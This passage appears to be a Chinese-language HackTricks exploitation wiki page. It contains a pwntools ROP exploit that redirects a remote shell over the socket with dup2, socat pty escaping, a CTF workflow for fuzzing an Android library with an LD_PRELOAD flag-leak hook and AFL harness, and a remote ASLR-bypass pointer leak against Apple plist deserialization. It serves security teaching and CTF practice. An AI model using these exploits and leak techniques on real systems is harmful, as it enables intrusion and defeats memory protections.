# 常见 Exploiting 问题

{{#include ../banners/hacktricks-training.md}}

## FDs 在 Remote Exploitation 中

例如，当向远程服务器发送一个 exploit（比如调用 **`system('/bin/sh')`**），该调用会在服务器进程中执行，且 `/bin/sh` 会从 stdin (FD: `0`) 接收输入，并将输出打印到 stdout 和 stderr (FDs `1` 和 `2`)。因此 attacker 无法与 shell 交互。

一种解决方法是假设在服务器启动时创建了 **FD number `3`**（用于监听），然后你的连接会落在 **FD number `4`**。因此，可以使用 syscall **`dup2`** 将 stdin (FD `0`) 和 stdout (FD `1`) 复制到 FD `4`（即 attacker 的连接），这样在 shell 被执行后就可以与之通信。

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

注意 socat 已经将 **`stdin`** 和 **`stdout`** 转发到 socket。不过，`pty` 模式会 **包含 DELETE 字符**。因此，如果你发送 `\x7f`（`DELETE`），它会 **删除你的 exploit 的前一个字符**。

为绕过此问题，**必须在任何发送的 `\x7f` 前加上转义字符 `\x16`。**

**Here you can** [**find an example of this behaviour**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

当一个 Android 应用只发布了剥离符号的 AArch64 `.so` 时，你仍然可以在设备上直接 fuzz 导出的逻辑，而无需重建 APK。一个实用的工作流程：

1. **定位可调用的入口点。** `objdump -T libvalidate.so | grep -E "validate"` 会快速列出导出函数。反编译器 (Ghidra, IDA, BN) 会揭示真实的签名，例如 `int validate(const uint8_t *buf, uint64_t len)`。
2. **编写一个独立的 harness。** 加载文件，保持 buffer 存活，并像应用那样精确调用导出的符号。使用 NDK 交叉编译（例如 `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`）。

<details>
<summary>Minimal file-driven harness</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Reconstruct the expected structure.** 在 Ghidra 中的错误字符串和比较显示该函数解析严格的 JSON，具有常量键（`magic`、`version`、嵌套的 `root.children.*`）和算术检查（例如，`value * 2 == 84` ⇒ `value` 必须为 `42`）。提供在语法上有效且逐步满足每个分支的 JSON 可以在不进行插装的情况下映射架构。
4. **Bypass anti-debug to leak secrets.** 因为该 `.so` 导入了 `snprintf`，可使用 `LD_PRELOAD` 覆盖它以转储敏感的格式字符串，即使断点被阻止也能做到：

<details>
<summary>Minimal snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` 外泄了内部 flag 并确认了 crash oracle，无需修补 binary。
5. **缩小 fuzz 空间。** Disassembly 揭示了一个在 flag 比较中重用的 XOR key，这意味着 `flag` 的前七个 bytes 已知。只针对九个未知的 bytes 进行 fuzz。
6. **在有效的 JSON 封装中嵌入 fuzz bytes。** AFL harness 从 `stdin` 精确读取九个 bytes，将其复制到 flag 的后缀，并把其它字段全部硬编码（constants、tree depths、arithmetic preimage）。任何格式错误的读取都会直接 exit，因此 AFL 把计算周期花在有意义的测试用例上：

<details>
<summary>最小化 AFL harness</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Run AFL with the crash-as-success oracle.** 任何满足所有语义检查并猜对九字节后缀的输入都会触发故意崩溃；那些文件会落在 `output/crashes`，并可以通过简单的 harness 回放以恢复 secret。

This workflow lets you triage anti-debug-protected JNI validators quickly, leak secrets when needed, then fuzz only the meaningful bytes, all without touching the original APK.

## Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization

### Requirements & attack surface

- 一个服务接受攻击者控制的 property lists (XML or binary) 并调用 `NSKeyedUnarchiver.unarchivedObjectOfClasses`，使用宽松的 allowlist（例如 `NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`）。
- 生成的对象被重用并随后使用 `NSKeyedArchiver` 再次序列化（或以确定性的桶顺序迭代）并返回给攻击者。
- 容器中的某些键类型使用指针值作为其哈希码。在 March 2025 之前，`CFNull`/`NSNull` 回退到 `CFHash(object) == (uintptr_t)object`，并且反序列化总是返回 shared-cache 单例 `kCFNull`，从而提供一个稳定的 kernel-shared pointer，且没有内存损坏或时序问题。

### Controllable hashing primitives

- **Pointer-based hashing:** `CFNull`’s `CFRuntimeClass` lacks a hash callback, so `CFBasicHash` uses the object address as the hash. Because the singleton lives at a fixed shared-cache address until reboot, its hash is stable across processes.
- **Attacker-controlled hashes:** 32-bit `NSNumber` keys are hashed through `_CFHashInt`, which is deterministic and attacker-controllable. Picking specific integers lets the attacker choose `hash(number) % num_buckets` for any table size.
- **`NSDictionary` implementation:** Immutable dictionaries embed a `CFBasicHash` with a prime bucket count chosen from `__CFBasicHashTableSizes` (e.g., 23, 41, 71, 127, 191, 251, 383, 631, 1087). Collisions are handled with linear probing (`__kCFBasicHashLinearHashingValue`), and serialization walks buckets in numeric order; therefore, the order of serialized keys encodes the bucket index that each key finally occupied.

### Encoding bucket indices into serialization order

通过构造一个会实例化出桶在占用与空槽之间交替的字典的 plist，攻击者可以限制线性探测将 `NSNull` 放置的位置。以 7 桶为例，使用 `NSNumber` 键填充偶数桶会产生：
```text
bucket:          0 1 2 3 4 5 6
occupancy:       # _ # _ # _ #
```
在反序列化期间，受害者插入单个 `NSNull` 键。它的初始 bucket 是 `hash(NSNull) % 7`，但探测会前进直到命中开放索引之一 {1,3,5}。序列化的键顺序揭示了使用的是哪个槽，从而表明指针哈希对 7 取模落在 {6,0,1}, {2,3}，或 {4,5} 中的哪一组。因为攻击者控制原始的序列化顺序，`NSNull` 键在输入 plist 中最后被发出，所以反序列化后（post-reserialization）的顺序仅由 bucket 的放置决定。

### Resolving exact residues with complementary tables

单个字典只会 leaks 一组余数范围。要确定 `hash(NSNull) % p` 的精确值，对于每个素数 bucket 大小 `p` 构建 **两个** 字典：一个预填充了偶数 bucket，另一个预填充了奇数 bucket。对于互补模式 (`_ # _ # _ # _`)，空槽 (0,2,4,6) 映射到余数集合 {0}, {1,2}, {3,4}, {5,6}。观察 `NSNull` 在两个字典中序列化后的位置会将余数缩小到单一值，因为两个候选集合的交集为该 `p` 给出唯一的 `r_i`。

攻击者将所有字典打包到一个 `NSArray` 中，因此一次反序列化 → 再序列化的往返就会泄露每个选定表大小的余数。

### Reconstructing the 64-bit shared-cache pointer

对于每个素数 `p_i ∈ {23, 41, 71, 127, 191, 251, 383, 631, 1087}`，攻击者从序列化顺序中恢复 `hash(NSNull) ≡ r_i (mod p_i)`。使用扩展欧几里得算法应用中国剩余定理（CRT）得到：
```text
Π p_i = 23·41·71·127·191·251·383·631·1087 = 0x5ce23017b3bd51495 > 2^64
```
因此，组合后的余数唯一地等于指向 `kCFNull` 的 64 位指针。Project Zero PoC 迭代地合并同余，并打印中间模数以显示其向真实地址收敛（在易受攻击的构建上为 `0x00000001eb91ab60`）。

### 实际工作流程

1. **Generate crafted input:** 构建攻击者端的 XML plist（每个 prime 两个 dictionary，`NSNull` 最后序列化），并将其转换为二进制格式。
```bash
clang -o attacker-input-generator attacker-input-generator.c
./attacker-input-generator > attacker-input.plist
plutil -convert binary1 attacker-input.plist
```
2. **Victim round trip:** 受害服务使用 `NSKeyedUnarchiver.unarchivedObjectOfClasses` 进行反序列化，允许的类集合为 `{NSDictionary, NSArray, NSNumber, NSString, NSNull}`，并随后使用 `NSKeyedArchiver` 立即重新序列化。
3. **Residue extraction:** 将返回的 plist 转换回 XML 会揭示 dictionary 键的顺序。一些辅助工具，例如 `extract-pointer.c`，读取对象表，确定单例 `NSNull` 的索引，将每个 dictionary 对映射回其桶余数，然后求解 CRT 系统以恢复 shared-cache 指针。
4. **Verification (optional):** 编译一个小型 Objective-C 辅助程序来打印 `CFHash(kCFNull)`，可以确认 leaked 值与真实地址相符。

不需要内存安全漏洞——仅通过观察 pointer-keyed structures 的序列化顺序即可得到一个远程 ASLR 绕过原语。

## 相关页面

{{#ref}}
common-exploiting-problems-unsafe-relocation-fixups.md
{{#endref}}

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## References

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)
- [Pointer leaks through pointer-keyed data structures (Project Zero)](https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html)

{{#include ../banners/hacktricks-training.md}}
